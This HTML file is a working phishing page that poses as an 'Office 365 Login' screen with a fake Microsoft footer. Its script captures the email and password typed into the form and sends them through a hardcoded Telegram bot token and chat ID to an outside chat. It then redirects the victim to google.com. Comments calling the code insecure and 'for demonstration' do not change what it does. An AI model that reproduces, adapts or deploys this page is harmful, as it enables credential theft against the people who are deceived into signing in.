<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Office 365 Login</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .login-container {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            padding: 30px;
            width: 400px;
            text-align: center;
        }

        .logo-container {
            margin-bottom: 20px;
        }

        .logo {
            width: 50px; /* Adjust size as needed */
            height: 50px;
            margin: 0 10px;
            vertical-align: middle;
        }

        h2 {
            color: #333;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            text-align: left;
            margin-bottom: 5px;
            color: #555;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
        }

        button {
            background-color: #007bff;
            color: #fff;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
        }

        button:hover {
            background-color: #0056b3;
        }

        .footer {
            margin-top: 20px;
            color: #777;
            font-size: 12px;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="logo-container">
            <img src="pdf_logo.png" alt="PDF" class="logo">
            <img src="excel_logo.png" alt="Excel" class="logo">
            <img src="google_drive_logo.png" alt="Google Drive" class="logo">
            <img src="onenote_logo.png" alt="OneNote" class="logo">
        </div>
        <h2>Sign in</h2>
        <form id="loginForm" action="login.php" method="post">  <!-- removed target attribute -->
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" placeholder="Enter your email" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            <button type="submit">Sign in</button>
        </form>
        <div class="footer">
            &copy; 2025 Microsoft Corporation
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent the default form submission

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // **SECURITY WARNING:** Never store Telegram API keys or Chat IDs in client-side code!
            // This is for demonstration purposes ONLY and is extremely insecure.
            // Implement a server-side solution for Telegram integration.

            // **VERY INSECURE - DO NOT USE IN PRODUCTION**
            const telegramBotToken = '8522432484:AAHdGiaeCD8T1xYxd-8lO2g47CIucVT316s'; // Replace with your bot token
            const telegramChatId = '8344813196';     // Replace with your chat ID

            const message = `Login attempt:\nEmail: ${email}\nPassword: ${password}`; //DO NOT SEND PASSWORDS. THIS IS AN EXAMPLE OF WHAT NOT TO DO!

            // Insecure method (DO NOT USE IN REAL-WORLD APPLICATIONS)
            const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;

            fetch(telegramApiUrl)
                .then(response => {
                    if (response.ok) {
                        console.log('Message sent to Telegram!');
                    } else {
                        console.error('Failed to send message to Telegram:', response.status);
                    }
                })
                .catch(error => {
                    console.error('Error sending message to Telegram:', error);
                });

            // Redirect to your desired URL after (attempting) Telegram submission
            window.location.href = "https://www.google.com/"; // Replace with your URL
        });
    </script>

</body>
</html>
